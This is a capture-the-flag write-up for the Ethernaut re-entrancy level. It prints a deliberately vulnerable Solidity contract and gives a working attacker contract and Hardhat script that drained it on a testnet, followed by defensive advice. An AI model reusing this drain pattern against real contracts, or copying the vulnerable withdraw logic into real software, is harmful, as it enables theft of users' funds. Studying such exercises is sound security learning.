---
title: Ethernaut Re-entrancy
tags: [ethernaut]
style: border
color: primary
description: Ethernaut Re-entrancy challenge writeup
---

## Re-entrancy

### Challenge

The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

* Untrusted contracts can execute code where you least expect it.
* Fallback methods
* Throw/revert bubbling
* Sometimes the best way to attack a contract is with another contract.
* See the Help page above, section "Beyond the console"


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

### Background

This is a classic re-entrancy attack as the title suggests. A re-entrancy attack is when the victim contact calls into an attacker controlled contract in some way, and the attacker controlled contract calls some functionality in the victim contract before the first function call is finished. This can have some devestating implecation if the contract assumes that the entire function call has finished. For example, if a withdraw function is called all checks passed and before the new amount is updated the function gives execution to the attacker controled contract, the attacker can re-enter the same function before the total was subrated and receive the funds again.  

### Attack

Create a contract that when receiving funds calls the `withdraw` function again until all funds are withdrawn. Then make sure to stop to avoid reverting. The contract should also have the functionality to call the `withdraw` function

* Create a contract that can:
  * Call the `withdraw` function
  * When receiving funds call `withdraw` again util the target is out of funds
* Transfer all funds to the attacker controlled contract using the `donate` function
* Call the `withdraw` functionality through the attacker controlled contract


#### ReentranceSolve.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

import '../challenges/Reentrance.sol';

contract ReentranceSolve {

    Reentrance reentranceContract;
    uint256 amount;
    uint256 times;
    uint256 counter;

    constructor(address payable _reentranceAddress, uint256 _amount) public {
        reentranceContract = Reentrance(_reentranceAddress);
        amount = _amount;
        times = 0;
        counter = 0;
    }
    
    function withdraw (uint256 _times) public {
        times = _times;
        // _king.call.value(msg.value)("");
        // _king.call{value: msg.value}("");
        reentranceContract.withdraw(amount);
    }

    receive() external payable {
        counter++;
        if (counter < times)
            reentranceContract.withdraw(amount);
    }
}
```

#### reentrance-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    reentranceAddress = "0x143E03bB8B5e89ec5A7f38B2F52296378723e27C";
    contract = await ethers.getContractAt("Reentrance", reentranceAddress);
    
    const accounts = await hre.ethers.getSigners();
    account = accounts[0];

    contractBalance = await ethers.provider.getBalance(contract.address)

    console.log("Initial Contract Balance: " + contractBalance)
    
    ReentranceSolve = await ethers.getContractFactory("ReentranceSolve");
    reentranceSolve = await ReentranceSolve.deploy(contract.address, contractBalance);
    await reentranceSolve.deployed();

    // donate funds for attacker contract
    tx = await contract.donate(reentranceSolve.address, {value: contractBalance})
    receipt = await tx.wait()

    contractBalance = await ethers.provider.getBalance(contract.address)
    reentranceSolveBalance = await ethers.provider.getBalance(reentranceSolve.address)
    reentranceSolveTokenBalance = await contract.balanceOf(reentranceSolve.address)
    console.log("Contract Balance      : " + contractBalance)
    console.log("Attacker Balance      : " + reentranceSolveBalance)
    console.log("Attacker Token Balance: " + reentranceSolveTokenBalance)

    // transfer token funds
    tx = await reentranceSolve.connect(account).withdraw(2)
    receipt = await tx.wait()

    contractBalance = await ethers.provider.getBalance(contract.address)
    reentranceSolveBalance = await ethers.provider.getBalance(reentranceSolve.address)
    reentranceSolveTokenBalance = await contract.balanceOf(reentranceSolve.address)
    console.log("Contract Balance      : " + contractBalance)
    console.log("Attacker Balance      : " + reentranceSolveBalance)
    console.log("Attacker Token Balance: " + reentranceSolveTokenBalance)
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/reentrance-solve.js --network rinkeby
Initial Contract Balance: 1000000000000000
Contract Balance      : 2000000000000000
Attacker Balance      : 0
Attacker Token Balance: 1000000000000000
Contract Balance      : 0
Attacker Balance      : 2000000000000000
Attacker Token Balance: 115792089237316195423570985008687907853269984665640564039457583007913129639936
```

#### Alternative solution

If our funds were much less that the contract funds we might run in an out of gas error because the times we reenter might a lot. This might require that we run this attack in multiple steps. An alternative would be to run it twice so that our balance wraps to an huge number and then run once more and extract the full contract balance. 

### Success Message

In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

 
#### The DAO Hack

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).
